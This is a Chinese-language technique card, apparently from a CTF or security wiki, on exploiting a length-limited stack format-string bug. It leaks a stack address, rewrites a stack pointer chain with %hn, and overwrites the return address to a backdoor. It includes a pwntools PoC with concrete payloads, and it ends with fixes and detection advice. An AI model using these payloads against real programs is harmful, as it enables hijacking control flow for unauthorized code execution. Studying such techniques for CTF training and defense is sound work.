---
id: binary-pwn-format-string-stack-pointer-chain-return-address-backdoor
title: 栈上格式化字符串 0x10 字节限制：%10$p 泄露栈地址、%10$hn 改写指针搭链，%14$hn 覆写返回地址到后门
type: scenario
domain: binary
path: binary/pwn/format-string
technique: stack-format-string-pointer-chain-return-address-overwrite
aliases:
- 栈上格式化字符串改返回地址
- '%10$p 泄露栈地址'
- 栈指针链 a-b-c
- '%14$hn 写返回地址'
- 0x10 字节格式化字符串
- 格式化字符串打后门函数
- ret2win 格式化字符串
tags:
- pwn
- format-string
- stack
- pointer-chain
- return-address
- hn
- partial-overwrite
- aslr-bruteforce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V191
  verified_at: '2026-11-06T22:40:59+08:00'
  notes: 已对照原文与18张图核对：read(0,buf,0x10)+printf(buf)、%10泄露栈地址(-0x18)、%10改指针链、%14写返回地址低2字节至后门0x54E3、远程低12位稳定需重试，均与原文/截图一致；PoC未复跑
---

## 一句话结论

当程序每轮只 `read(0, buf, 0x10)` 后直接 `printf(buf)`、没有栈溢出时，可先用 `%10$p` 泄露一个栈地址，第二轮用 `%<low16>c%10$hn` 把该栈地址指向的指针槽改写成返回地址槽的地址，搭出 a→b→c 的指针链，第三轮用 `%<backdoor>c%14$hn` 经这条链把返回地址低 2 字节改成同页的后门函数；远程 ASLR 下栈地址的低 16 位会变化，需要按页偏移稳定后重试。

## 原理

- **漏洞形态**：`talk_with_god()` 里 `read(0, buf, 0x10)` 只读 0x10 字节，不存在栈溢出；随后 `printf(buf)` 把用户输入当格式串，构成格式化字符串漏洞。输入长度足以容纳 `%<数字>c%<索引>$hn` 形式的短 payload。
- **%n 的写入语义**：`%k$hn` 取第 k 个可变参数槽里的值当作地址，把已输出字符数截断为 16 位写到该地址。因此只要能控制某个参数槽中的指针，就能控制写入目标；而参数槽本身位于栈上，可以被另一个 `%n` 改写。
- **两级指针链**：目标程序栈上存在一条 `a -> b -> c` 的指针链，其中 a 是某个可变参数槽保存的栈地址，b 是 a 指向的槽里保存的指针，c 是最终的返回地址槽。先用 `%10$hn` 把 b 的低 16 位改成返回地址槽的地址，使链尾从原来的位置改为 c；再用 `%14$hn` 通过这条被重定向的链，把后门函数地址的低 16 位写到 c（返回地址）。
- **为什么只改 2 字节就够**：二进制非 PIE，返回地址与后门函数（本例 0x54E3）在同一 64KB 段内，高 6 字节相同；只需把返回地址低 16 位从原值改成 0x54E3，就能让函数返回时跳到后门。原文调试现场返回地址为 `game+121`（0x...54ab），把低 2 字节改为 0x54e3 后即为后门。
- **栈地址泄露**：`%10$p` 输出一个栈指针 L；`stack = L - 0x18` 得到返回地址槽的地址（具体偏移随栈帧变化）。第一轮 payload 的写入值取 `stack & 0xffff`，宽度即该 16 位值，写入目标是 `%10$hn` 对应的栈槽所指向的地址。
- **远程 ASLR 的重试**：栈页内偏移（低 12 位，即最后 3 个十六进制位）在远程各次连接中保持不变，但第 13–16 位会随 ASLR 变化，因此 `stack & 0xffff` 会变。脚本需要反复建立连接，直到本次泄露的栈低 16 位与 payload 预期一致、后门写入成功。

## 触发条件

- 程序存在 `printf(用户可控缓冲区)`，且缓冲区在栈上；每轮输入长度受限（本例 0x10 字节），无法用长填充或多地址布局。
- 二进制非 PIE（或已泄露代码基址），后门/目标函数与返回地址处于同一 64KB 区间，低 2 字节覆写即可命中。
- 程序提供多轮输入（本例每轮进入菜单后可选 1 再次 `talk_with_god`），允许分三次完成“泄露 → 改指针 → 写返回地址”。
- 栈上存在可用的指针链：某个位置参数槽（本例 10）保存的地址可被改写，且另一个参数槽（本例 14）经该指针最终指向返回地址槽。
- `%n`/`%hn` 未被过滤；`printf` 的参数索引与栈偏移可稳定复现。
- 远程栈 ASLR 只影响低 16 位中的高位部分，可通过重试命中。

## 利用步骤

1. 通过菜单进入 `talk_with_god`，先发送 `%10$p` 泄露栈地址 L；在 pwndbg 中确认 L 与返回地址槽的关系，计算 `stack = L - 0x18`（偏移按目标样本重新确认）。
2. 找到能最终指向返回地址槽的参数索引：原文为 `%14$hn`，且需要先改写 `%10$hn` 所指向的指针槽，才能把链尾从 b 改到 c。
3. 第二轮：发送 `%<stack & 0xffff>c%10$hn`，把 b 的低 16 位改成 `stack` 的低 16 位，完成 a→b→c 链的重定向。
4. 第三轮：发送 `%<backdoor>c%14$hn`，经重定向后的链把后门地址低 16 位写到返回地址槽；函数返回即进入后门。
5. 远程利用时循环重连：每次先 `%10$p` 取 L，若 `(L - 0x18) & 0xffff` 对应的页内偏移不符合预期或写后无 shell，则重试；原文提到远程只有最后三位（页内偏移）稳定。
6. 进入后门后通常是 `system("/bin/sh")` 或直接读 flag 的分支；若后门不回显，改用 `cat flag` 验证。

## PoC

原文 exp 的核心流程（索引、偏移按原题；远程需重试）：

```python
from pwn import *
context(arch='amd64')

for _ in range(5):                    # 先通过几轮加法校验
    rl("what's "); a = int(p.recv(2), 10)
    rl("add ");   b = int(p.recv(2), 10)
    sl(str(a + b))

rl("leave"); sl(str(1))
rl("Input:")
s(b'%10$p')                           # 泄露栈地址
rl("0x")
stack = int(p.recv(12), 16) - 0x18    # 返回地址槽
backdoor = 0x54E3

rl("leave"); sl(str(1))
rl("Input:")
s(b'%' + str(stack & 0xffff).encode() + b'c%10$hn')   # 改 b 指针

rl("leave"); sl(str(1))
rl("Input:")
s(b'%' + str(backdoor).encode() + b'c%14$hn')         # 写返回地址
p.interactive()
```

调试要点：在第二次 `printf` 前断下，查看 `%10`/`%14` 对应栈槽及 `a->b->c` 链；第一次 `%10$hn` 后 b 的值应变成返回地址槽地址，第二次 `%14$hn` 后返回地址低 2 字节应为 `0x54e3`。

## 变体与关联

- 变体：若某个参数槽直接保存返回地址，可省掉改指针步骤，用一次 `%k$hn` 直接写返回地址。
- 变体：输入更短时用 `%hhn` 逐字节写；目标地址跨 64KB 时需写 3–6 字节或先泄露 PIE/libc。
- 变体：把返回地址改成 one_gadget 或 ROP 链，而不是固定的后门函数。
- 关联：[[binary-pwn-format-string-one-shot-stack-return-address-two-n-writes]]（单次 printf 两段重叠 %n 写返回地址）、[[binary-pwn-format-string-nonstack-pointer-chain-got-overwrite]]（非栈上格式串的指针链中转）、[[binary-pwn-format-string-got-hijack]]（直接 GOT 覆写）、[[binary-pwn-format-string-limited-nonstack-loop-condition-byte-rop]]（有限次数 + 逐字节 ROP）。
- 边界：Full RELRO 不影响返回地址写入，但 PIE 会改变返回地址高位；`%n` 被过滤且无法绕过、栈上没有可改写参数槽、输入长度不足以容纳 `%<n>c%k$hn` 时该链不成立。

## 检测与防御

- **修复**：所有输出改为 `printf("%s", buf)`；编译加 `-Wformat-security -Werror=format-security` 和 `-D_FORTIFY_SOURCE=2`。
- **加固**：启用 PIE/ASLR（只能提高重试成本，不能修复格式化字符串）；栈上不放可利用的指针链；开启 Canary 对返回地址劫持无直接帮助，但可配合其它保护。
- **输入过滤**：拒绝 `%n`/`%hn`/`%lln` 只能作为补充，需同时限制 `%p`/`%s` 泄露与格式串长度。
- **检测**：监控输入中的 `%p`、`%n` 组合和异常短的格式化 payload；检测进程返回地址被改到同页非调用点、`printf` 后异常跳转到后门/`system`；对关键服务启用 Full RELRO 并审计 `printf` 调用。
- **响应**：确认被利用后检查进程是否执行 shell、是否读取敏感文件，重启并部署修复后的二进制。
